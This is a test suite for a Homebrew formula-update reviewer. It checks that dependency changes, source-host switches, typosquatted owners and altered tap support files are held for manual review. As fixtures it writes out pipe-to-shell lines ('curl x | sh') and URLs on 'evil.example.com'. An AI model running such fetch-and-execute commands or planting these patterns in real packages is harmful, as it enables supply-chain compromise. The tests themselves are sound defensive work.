// Ported from the previous updater's formula-review cases: a real git tap per
// case, brew faked through FormulaEnv. The package is example/tool/tool (the source fixture's
// own tap is renamed).
import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, readFileSync, renameSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { FORMULA_TAIL, SURFACE_TAIL, formulaReview, VERDICT_CONTRACT, type FormulaEnv } from "../../src/apply/formula.ts";
import { scripted } from "./helpers.ts";
import { APPROVE, cleanupFixtures, fixture, git, OFFICIAL, OTHER, PREBUILT, rb, SOURCE, TAP, type Fx } from "./tap-fixture.ts";

afterAll(cleanupFixtures);

async function review(f: Fx = {}, answers: string[] = [], fallback = APPROVE, over: { newUrl?: string } = {}) {
  const fx = fixture(f);
  const { r, prompts } = scripted(answers, fallback);
  const notices: string[] = [];
  const res = await formulaReview(fx.env, r, {
    pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: f.artifact ?? "prebuilt", tapDir: fx.tap, head: fx.head,
    newUrl: f.newUrl ?? PREBUILT("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: (t) => void notices.push(t), ...over,
  });
  return { ...res, prompts, notices, fx };
}

describe("formulaReview", () => {
  test("prebuilt tap: formula-only review, APPROVE → installable, the pin recorded", async () => {
    const v = await review();
    expect(v).toMatchObject({ rc: 0, calls: 1 });
    const p = v.prompts[0]!;
    for (const s of ["Homebrew FORMULA", "PREBUILT", `+  url "https://github.com/example/tool/releases/download/v1.1/`, `-  version "1.0"`, "post_install"]) expect(p).toContain(s);
    expect(p).not.toContain("WHOLE current formula file");
    expect(v.pin).toEqual({ pkg: "tool", tapDir: v.fx.tap, head: v.fx.head, rbPath: "Formula/tool.rb" });
  });
  test("prebuilt tap: a formula FLAG holds it, notified once", async () => {
    const v = await review({}, ['FLAG\n1. FLAG: "(var/\\"tool\\").mkpath" indicator 5']);
    expect(v.rc).toBe(1);
    expect(v.pin).toBeUndefined();
    expect(v.notices).toHaveLength(1);
    expect(v.notices[0]).toStartWith("⚠️ <b>fixture Type B FLAG — tool (formula)</b>");
  });
  test("no tap revision on the receipt → the whole formula file, and the prompt says so", async () => {
    const v = await review({ receipt: "none", oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1"), artifact: "source" });
    expect(v.rc).toBe(0);
    const p = v.prompts[0]!;
    for (const s of ["WHOLE current formula file", "no tap revision", "class Tool < Formula", `  version "1.1"`]) expect(p).toContain(s);
    expect(p).not.toContain(`-  version "1.0"`);
  });
  test("a receipt revision not in the local clone → the whole formula file", async () => {
    const v = await review({ receipt: "unknown", artifact: "source", oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1") });
    expect(v.prompts[0]).toContain("WHOLE current formula file");
    expect(v.prompts[0]).toContain("deadbeefdead");
  });
  test("the formula file cannot be located → rc 2, no reviewer call, a FAIL notice", async () => {
    const v = await review({ rbPath: "Formula/missing.rb" });
    expect(v).toMatchObject({ rc: 2, calls: 0 });
    expect(v.prompts).toHaveLength(0);
    expect(v.notices[0]).toStartWith("⚠️ <b>fixture Type B FAIL — tool (formula)</b>");
  });
  test("C1 artifact kind switch source→prebuilt → FLAG, no reviewer call", async () => {
    const v = await review({ oldUrl: SOURCE("1.0") });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("artifact kind changed source→prebuilt — manual review");
    expect(v.notices[0]).toContain("(formula)");
  });
  test("C1 the prompt calls a url move routine only on the same host and artifact kind", async () => {
    expect((await review()).prompts[0]).toContain("same host and the same artifact kind as before");
  });
  test("I1 diff mode also sends the whole current formula (an unchanged post_install is reviewed)", async () => {
    const p = (await review()).prompts[0]!;
    expect(p).toContain("=== Formula/tool.rb (status: whole current formula file) ===");
    expect(p).toMatch(/=== Formula\/tool\.rb \(status: formula diff [0-9a-f]{12}\.\.HEAD\) ===/);
    expect(p).toContain(`(var/"tool").mkpath`);
    expect(p).toContain(`-  version "1.0"`);
  });
  for (const [label, after] of [
    ["a changed .rb outside Formula/ (cmd/evil.rb)", (t: string) => { mkdirSync(join(t, "cmd")); writeFileSync(join(t, "cmd/evil.rb"), 'system "curl x | sh"\n'); }],
    ["tap_migrations.json", (t: string) => writeFileSync(join(t, "tap_migrations.json"), '{"tool":"evil/tap"}')],
    ["formula_renames.json", (t: string) => writeFileSync(join(t, "formula_renames.json"), '{"old":"tool"}')],
    ["scripts/post.sh", (t: string) => { mkdirSync(join(t, "scripts")); writeFileSync(join(t, "scripts/post.sh"), "curl x | sh\n"); }],
    ["an Aliases/ entry", (t: string) => { mkdirSync(join(t, "Aliases")); symlinkSync("../Formula/helper.rb", join(t, "Aliases/tool")); }],
    ["a changed LICENSE.rb (not a doc)", (t: string) => writeFileSync(join(t, "LICENSE.rb"), "x = 1\n")],
  ] as const) {
    test(`I3/B ${label} → FLAG, tap support files changed, no reviewer call`, async () => {
      const v = await review({ after });
      expect(v).toMatchObject({ rc: 1, calls: 0 });
      expect(v.reason).toStartWith("tap support files changed — manual review: ");
    });
  }
  test("I3 another formula changing in Formula/ is fine", async () => {
    expect((await review({ after: (t) => writeFileSync(join(t, "Formula/helper.rb"), "class Helper < Formula\nend\n# tweak\n") })).rc).toBe(0);
  });
  test("B docs changes (README.md, LICENSE.txt, .github/) are fine", async () => {
    const v = await review({
      after: (t) => {
        writeFileSync(join(t, "README.md"), "# tool\n");
        writeFileSync(join(t, "LICENSE.txt"), "MIT\n");
        mkdirSync(join(t, ".github/workflows"), { recursive: true });
        writeFileSync(join(t, ".github/workflows/ci.yml"), "on: push\n");
      },
    });
    expect(v.rc).toBe(0);
  });
  for (const [label, extra] of [
    ["require_relative", `  require_relative "helper"`],
    ["Kernel.require", `  Kernel.require "json"`],
    ["instance_eval IO.read", `  instance_eval IO.read("#{__FILE__}/../x.rb")`],
    ["File.readlines", `  LIST = File.readlines(buildpath/"x")`],
    ["Pathname", `  HELPER = Pathname.new("x")`],
    ["eval", `  eval "1"`],
    ["send(:require)", `  send(:require, "x")`],
  ] as const) {
    test(`R4 a formula using ${label}, and another tap file changed → FLAG, loads other tap files`, async () => {
      const v = await review({ oldExtra: extra, newExtra: extra, after: (t) => writeFileSync(join(t, "Formula/helper.rb"), "class Helper < Formula\nend\n# touched\n") });
      expect(v).toMatchObject({ rc: 1, calls: 0 });
      expect(v.reason).toStartWith("formula loads other tap files");
    });
  }
  for (const [label, extra, infoDeps, flag] of [
    ["fully qualified other tap", `  depends_on "evil/tap/x"`, [], true],
    ["same-tap formula", `  depends_on "helper"`, [], true],
    ["same-tap formula, fully qualified", `  depends_on "example/tool/helper" => :build`, [], true],
    ["homebrew/core formula", `  depends_on "openssl@3"`, [], false],
    ["fully qualified homebrew/core", `  depends_on "homebrew/core/xz"`, [], false],
    ["single quotes", `  depends_on 'evil/tap/x'`, [], true],
    ["parentheses", `  depends_on("evil/tap/x")`, [], true],
    ["an alias resolving to this tap (brew-evaluated)", "", ["toolx"], true],
    ["a bare name resolving to another third-party tap", `  depends_on "helper2"`, [], true],
    ["an unresolvable dependency", `  depends_on "nosuchdep"`, [], true],
    ["a core dependency in parentheses and single quotes", `  depends_on('xz')`, [], false],
  ] as const) {
    test(`I4/A new dependency: ${label} → ${flag ? "FLAG" : "allowed"}`, async () => {
      const v = await review({ newExtra: extra, infoDeps: [...infoDeps] });
      if (flag) {
        expect(v).toMatchObject({ rc: 1, calls: 0 });
        expect(v.reason).toStartWith("new dependency outside the official taps: ");
      } else expect(v.rc).toBe(0);
    });
  }
  test("I4 an existing same-tap dependency is not new", async () => {
    expect((await review({ oldExtra: `  depends_on "helper"`, newExtra: `  depends_on "helper"` })).rc).toBe(0);
  });
  test("A a dependency already in the receipt's runtime_dependencies is not new", async () => {
    expect((await review({ infoDeps: ["toolx"], runtimeDeps: ["example/tool/toolx"] })).rc).toBe(0);
  });
  test("R2 core openssl@3 replaced by a same-named tap formula → FLAG", async () => {
    const v = await review({ oldExtra: `  depends_on "openssl@3"`, newExtra: `  depends_on "example/tool/openssl@3"` });
    expect(v).toMatchObject({ rc: 1, calls: 0, reason: "new dependency outside the official taps: example/tool/openssl@3 — manual review" });
  });
  test("R2 an unchanged core dependency stays allowed", async () => {
    expect((await review({ oldExtra: `  depends_on "openssl@3"`, newExtra: `  depends_on "openssl@3"` })).rc).toBe(0);
  });
  test("M4 the formula unchanged since the receipt's revision → the whole file, the prompt says no change", async () => {
    const v = await review({ receipt: "head" });
    expect(v.prompts[0]).toContain("WHOLE current formula file");
    expect(v.prompts[0]).toContain("shows no change");
  });
  test("Ma prebuilt with no old formula (no receipt revision) → FLAG, no reviewer call", async () => {
    const v = await review({ receipt: "none" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("cannot establish the installed artifact kind");
    expect(v.unreadable).toBeUndefined();
  });
  for (const [label, shape] of [
    ["a constant", "const:" + SOURCE("1.0")],
    ["a method call", "raw:url url_for_release"],
    ["a url only inside a resource block", `raw:resource "r" do\n    url "${SOURCE("1.0")}"\n  end`],
    ["no url at all", "raw:# no url here"],
  ] as const) {
    test(`Md an installed formula whose url cannot be read (${label}) → FLAG, no reviewer call`, async () => {
      const v = await review({ oldUrl: shape, newUrl: SOURCE("1.1"), artifact: "source" });
      expect(v).toMatchObject({ rc: 1, calls: 0 });
      expect(v.reason).toBe("cannot read the installed formula's url — manual review");
      expect(v.unreadable).toBe(true);
    });
  }
  test("Md no installed formula at all (no receipt revision) with a source artifact still goes to the reviewer", async () => {
    expect((await review({ receipt: "none", oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1"), artifact: "source" })).rc).toBe(0);
  });
  // The tap moved the formula file after the installed revision: the old text is read from where it was.
  const moved = (t: string) => {
    mkdirSync(join(t, "Formula/t"), { recursive: true });
    renameSync(join(t, "Formula/tool.rb"), join(t, "Formula/t/tool.rb"));
  };
  test("Me a formula file the tap moved to a subdirectory: the installed text is read from its old path, so the source repo is still checked", async () => {
    const v = await review({ oldUrl: SOURCE("1.0"), newUrl: "https://evil.example.com/tool/1.1/tool-1.1.tar.gz", artifact: "source", after: moved, rbPath: "Formula/t/tool.rb" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("source repo changed:");
  });
  test("Me a moved prebuilt formula from the same repo: its installed text is recovered, so it is reviewed (with none it would be held)", async () => {
    const v = await review({ after: moved, rbPath: "Formula/t/tool.rb" });
    expect(v).toMatchObject({ rc: 0, calls: 1 });
  });
  // Where the installed file was, at the installed revision (`before` moves it there; the new formula is at Formula/tool.rb).
  const wasAt = (path: string) => (t: string) => {
    mkdirSync(join(t, path.split("/").slice(0, -1).join("/") || "."), { recursive: true });
    renameSync(join(t, "Formula/tool.rb"), join(t, path));
  };
  /** A tap whose formulas all lived in `dir` ("" for the tap root) at the installed revision, tool.rb at `dir`/`sub`. */
  const layout = (dir: string, sub = "") => (t: string) => {
    const to = (f: string) => join(t, dir, f === "tool.rb" ? sub : "", f);
    mkdirSync(join(t, dir, sub), { recursive: true });
    renameSync(join(t, "Formula/tool.rb"), to("tool.rb"));
    if (dir !== "Formula") renameSync(join(t, "Formula/helper.rb"), to("helper.rb"));
  };
  for (const [dir, sub] of [["HomebrewFormula", ""], ["HomebrewFormula", "t"], ["", ""], ["Formula", "t"]] as const) {
    test(`Me the installed formula was at ${[dir, sub, "tool.rb"].filter(Boolean).join("/")}, brew's formula directory then: found, a prebuilt from the same repo is reviewed`, async () => {
      expect(await review({ before: layout(dir, sub) })).toMatchObject({ rc: 0, calls: 1 });
    });
  }
  test("Me a tool.rb in HomebrewFormula/ while Formula/ existed (brew never read it): not counted, held", async () => {
    const v = await review({ before: wasAt("HomebrewFormula/tool.rb") });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toContain("(no single tool.rb there)");
  });
  test("Me a decoy tool.rb in HomebrewFormula/ while Formula/ held the real one: the decoy counts nothing, the real one is compared", async () => {
    const decoy = (t: string) => {
      mkdirSync(join(t, "HomebrewFormula"), { recursive: true });
      writeFileSync(join(t, "HomebrewFormula/tool.rb"), rb("https://evil.example.com/tool/1.0/tool-1.0.tar.gz", "1.0"));
    };
    const v = await review({ oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1"), artifact: "source", before: decoy, after: moved, rbPath: "Formula/t/tool.rb" });
    expect(v).toMatchObject({ rc: 0, calls: 1 });
  });
  test("Me git show of the file found fails: held, with its own reason", async () => {
    const fx = fixture({ after: moved, rbPath: "Formula/t/tool.rb" });
    const { r } = scripted([], APPROVE);
    const env: FormulaEnv = { ...fx.env, git: async (d, args) => (args[0] === "show" && args[1] === `${fx.oldRev}:Formula/tool.rb` ? { rc: 128, out: "" } : fx.env.git(d, args)) };
    const v = await formulaReview(env, r, { pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "prebuilt", tapDir: fx.tap, head: fx.head, newUrl: PREBUILT("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {} });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toBe(`cannot read the installed formula at its tap revision ${fx.oldRev.slice(0, 12)} (git show of Formula/tool.rb failed) — manual review`);
  });
  test("Me the installed formula was at cmd/tool.rb (not a formula directory): not found → FLAG", async () => {
    const v = await review({ before: wasAt("cmd/tool.rb") });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("cannot read the installed formula at its tap revision");
  });
  test("Me no file of that name at the installed revision (renamed to another name): FLAG", async () => {
    const v = await review({ before: wasAt("Formula/tool-old.rb") });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("cannot read the installed formula at its tap revision");
  });
  test("Me a decoy second tool.rb under a non-ASCII directory at the installed revision is listed (ls-tree -z): no single file, held", async () => {
    const decoy = (t: string) => {
      mkdirSync(join(t, "Formula/é"), { recursive: true });
      writeFileSync(join(t, "Formula/é/tool.rb"), rb("https://evil.example.com/tool/1.0/tool-1.0.tar.gz", "1.0"));
    };
    const v = await review({ oldUrl: SOURCE("1.0"), newUrl: "https://evil.example.com/tool/1.1/tool-1.1.tar.gz", artifact: "source", before: decoy, after: moved, rbPath: "Formula/t/tool.rb" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toContain("(no single tool.rb there)");
  });
  test("Me a file only ending in the name (Formula/a/xtool.rb) is not the formula: none found, held", async () => {
    const v = await review({ before: wasAt("Formula/a/xtool.rb") });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toContain("(no single tool.rb there)");
  });
  test("Me a real move from HomebrewFormula/ (the formula directory then) into Formula/: the deleted file is in a formula directory, reviewed", async () => {
    const back = (t: string) => void git(t, "rm", "-q", "HomebrewFormula/tool.rb");
    const v = await review({ before: layout("HomebrewFormula"), after: back });
    expect(v).toMatchObject({ rc: 0, calls: 1 });
    expect(git(v.fx.tap, "diff", "--name-status", "--no-renames", `${v.fx.oldRev}..${v.fx.head}`).out).toContain("D\tHomebrewFormula/tool.rb");
  });
  test("Me a real move of a root tool.rb into Formula/ while Formula/ existed (brew read Formula/, not the root): held", async () => {
    const back = (t: string) => void git(t, "rm", "-q", "tool.rb");
    const v = await review({ before: wasAt("tool.rb"), after: back });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toContain("(no single tool.rb there)");
  });
  test("Me a real move of a root-only tap's tool.rb into Formula/: found at the root, then the deleted root file is a tap support change (listed with --no-renames): held", async () => {
    const back = (t: string) => void git(t, "rm", "-q", "tool.rb");
    const v = await review({ before: layout(""), after: back });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("tap support files changed — manual review: ");
    expect(v.reason).toContain("tool.rb");
  });
  test("Me git cannot list the installed revision (ls-tree fails): FLAG", async () => {
    const fx = fixture({ after: moved, rbPath: "Formula/t/tool.rb" });
    const { r } = scripted([], APPROVE);
    const env: FormulaEnv = { ...fx.env, git: async (d, args) => (args.includes("ls-tree") ? { rc: 128, out: "" } : fx.env.git(d, args)) };
    const v = await formulaReview(env, r, { pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "prebuilt", tapDir: fx.tap, head: fx.head, newUrl: PREBUILT("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {} });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toMatch(/^cannot list the tap at revision [0-9a-f]{12} — manual review$/);
  });
  test("Me the receipt revision exists but holds no single file of that name (two, here) → FLAG, no reviewer call, counted toward stuck", async () => {
    // At the old revision Formula/tool.rb and Formula/a/tool.rb both exist; brew now reads Formula/t/tool.rb.
    const twin = (t: string) => {
      mkdirSync(join(t, "Formula/a"), { recursive: true });
      writeFileSync(join(t, "Formula/a/tool.rb"), readFileSync(join(t, "Formula/tool.rb"), "utf8"));
    };
    const v = await review({ oldUrl: SOURCE("1.0"), newUrl: "https://evil.example.com/tool/1.1/tool-1.1.tar.gz", artifact: "source", before: twin, after: moved, rbPath: "Formula/t/tool.rb" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("cannot read the installed formula at its tap revision");
    // Counted toward stuck: no installed text was read.
    expect(v.unreadable).toBeUndefined();
  });
  test("Mf brew info gives no stable url: the new formula's own urls are compared, so a changed source repo is caught", async () => {
    const v = await review({ oldUrl: SOURCE("1.0"), newUrl: "https://evil.example.com/tool/1.1/tool-1.1.tar.gz", artifact: "source" }, [], APPROVE, { newUrl: "" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("source repo changed:");
  });
  test("Mf no stable url and none readable in the new formula → FLAG, no reviewer call, counted toward stuck", async () => {
    const v = await review({ oldUrl: SOURCE("1.0"), newUrl: "raw:url url_for_release", artifact: "source" }, [], APPROVE, { newUrl: "" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toBe("cannot read the new formula's url — manual review");
    expect(v.unreadable).toBeUndefined();
  });
  test("Mf no stable url, an allowed on_arm url then a changed-origin on_intel url in the new formula: every url is compared, held", async () => {
    const intel = `  on_intel do\n    url "https://evil.example.com/tool/1.1/tool-1.1.tar.gz"\n  end`;
    const v = await review({ oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1"), newExtra: `  on_arm do\n    url "${SOURCE("1.1")}"\n  end\n${intel}`, artifact: "source" }, [], APPROVE, { newUrl: "" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("source repo changed:");
    expect(v.reason).toContain("evil.example.com");
  });
  test("Md no stable url and an installed url that cannot be read: held (before, with no stable url it went to the reviewer)", async () => {
    const v = await review({ oldUrl: "const:" + SOURCE("1.0"), newUrl: SOURCE("1.1"), artifact: "source" }, [], APPROVE, { newUrl: "" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toBe("cannot read the installed formula's url — manual review");
    expect(v.unreadable).toBe(true);
  });
  test("Mg prebuilt whose installed formula exists but its url cannot be read: says so, not 'no installed formula revision'", async () => {
    const v = await review({ oldUrl: "raw:url url_for_release" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toBe("cannot read the installed formula's url — manual review");
    expect(v.unreadable).toBe(true);
  });
  test("Mg prebuilt with no receipt revision names that reason", async () => {
    expect((await review({ receipt: "none" })).reason).toBe("cannot establish the installed artifact kind (the install receipt for 1.0 records no tap revision) — manual review");
  });
  test("Mb an old formula with a source url in an on_arm block → source→prebuilt FLAG", async () => {
    const v = await review({ oldExtra: `  on_arm do\n    url "${SOURCE("1.0")}"\n  end` });
    expect(v.reason).toStartWith("artifact kind changed source→prebuilt");
  });
  test("Mb a source url inside a resource block does not count", async () => {
    const extra = `  resource "extra" do\n    url "${SOURCE("1.0")}"\n  end`;
    expect((await review({ oldExtra: extra, newExtra: extra })).rc).toBe(0);
  });
  test("D the url owner changed → FLAG, source repo changed", async () => {
    const v = await review({ newUrl: "https://github.com/examp1e/tool/releases/download/v1.1/tool-darwin-arm64.tar.gz" });
    expect(v).toMatchObject({ rc: 1, calls: 0 });
    expect(v.reason).toStartWith("source repo changed:");
  });
  test("D a non-GitHub url: host and first path segment are compared", async () => {
    const old = "https://releases.example.com/tool/1.0/tool_darwin_arm64.zip";
    expect((await review({ oldUrl: old, newUrl: "https://evil.example.com/tool/1.1/tool_darwin_arm64.zip" })).reason).toStartWith("source repo changed:");
    expect((await review({ oldUrl: old, newUrl: "https://releases.example.com/tool/1.1/tool_darwin_arm64.zip" })).rc).toBe(0);
  });
  test("Md the pin is the HEAD passed in at the start of the review, even if the tap moves during it", async () => {
    const fx = fixture();
    const { r } = scripted([], APPROVE);
    const env: FormulaEnv = {
      ...fx.env,
      brewInfo: async (name) => {
        writeFileSync(join(fx.tap, "Formula/helper.rb"), "class Helper < Formula\nend\n# moved\n");
        git(fx.tap, "commit", "-qam", "moved");
        return fx.env.brewInfo(name);
      },
    };
    const res = await formulaReview(env, r, {
      pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "prebuilt", tapDir: fx.tap, head: fx.head,
      newUrl: PREBUILT("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {},
    });
    expect(res.pin?.head).toBe(fx.head);
    expect(git(fx.tap, "rev-parse", "HEAD").out.trim()).not.toBe(fx.head);
  });
  for (const [label, text] of [
    ["null", "null"],
    ["an array", "[1]"],
    ["runtime_dependencies an object", `{"runtime_dependencies":{}}`],
    ["runtime_dependencies with a null entry", `{"runtime_dependencies":[null]}`],
    ["source not an object", `{"source":"x"}`],
  ] as const) {
    test(`a receipt of an odd shape (${label}) reads as no revision, never a crash`, async () => {
      const fx = fixture({ artifact: "source", oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1") });
      writeFileSync(join(fx.tap, "..", "Cellar/tool/1.0/INSTALL_RECEIPT.json"), text);
      const { r, prompts } = scripted([], APPROVE);
      const res = await formulaReview(fx.env, r, {
        pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "source", tapDir: fx.tap, head: fx.head,
        newUrl: SOURCE("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {},
      });
      expect(res.rc).toBe(0);
      expect(prompts[0]).toContain("no tap revision");
    });
  }
  test("a nested-array uses_from_macos entry is unresolved text, not the name inside it", async () => {
    const fx = fixture({ oldExtra: `  uses_from_macos "zlib"`, newExtra: `  uses_from_macos "zlib"` });
    const { r } = scripted([], APPROVE);
    const env: FormulaEnv = { ...fx.env, brewInfo: async (name) => (name === `${TAP}/tool` ? { ruby_source_path: "Formula/tool.rb", uses_from_macos: [["zlib"] as unknown as string] } : OTHER[name]) };
    const res = await formulaReview(env, r, {
      pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "prebuilt", tapDir: fx.tap, head: fx.head,
      newUrl: PREBUILT("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {},
    });
    expect(res).toMatchObject({ rc: 1, calls: 0 });
    expect(res.reason).toContain('["zlib"](unresolved)');
  });
  test("a uses_from_macos entry that is neither a name nor an object is an unresolved dependency", async () => {
    const fx = fixture();
    const { r } = scripted([], APPROVE);
    const env: FormulaEnv = { ...fx.env, brewInfo: async (name) => (name === `${TAP}/tool` ? { ruby_source_path: "Formula/tool.rb", uses_from_macos: [null as unknown as string] } : OTHER[name]) };
    const res = await formulaReview(env, r, {
      pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "prebuilt", tapDir: fx.tap, head: fx.head,
      newUrl: PREBUILT("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {},
    });
    expect(res).toMatchObject({ rc: 1, calls: 0, reason: "new dependency outside the official taps: null(unresolved) — manual review" });
  });
  test("an unreadable receipt is treated as no tap revision", async () => {
    const fx = fixture({ artifact: "source", oldUrl: SOURCE("1.0"), newUrl: SOURCE("1.1") });
    writeFileSync(join(fx.tap, "..", "Cellar/tool/1.0/INSTALL_RECEIPT.json"), "{not json");
    const { r, prompts } = scripted([], APPROVE);
    const res = await formulaReview(fx.env, r, {
      pkg: "tool", tap: TAP, oldVer: "1.0", newVer: "1.1", artifact: "source", tapDir: fx.tap, head: fx.head,
      newUrl: SOURCE("1.1"), officialTaps: OFFICIAL, host: "fixture", notify: () => {},
    });
    expect(res.rc).toBe(0);
    expect(prompts[0]).toContain("no tap revision");
  });
});

describe("formula prompts", () => {
  test("never use the word block (it reads as a contradiction in an approval)", async () => {
    const v = await review();
    const head = v.prompts[0]!.split("\nChunk 1 of")[0]!;
    for (const text of [head, FORMULA_TAIL.replace(VERDICT_CONTRACT, ""), SURFACE_TAIL.replace(VERDICT_CONTRACT, "")]) expect(text).not.toMatch(/\bblocks?\b/i);
  });
});
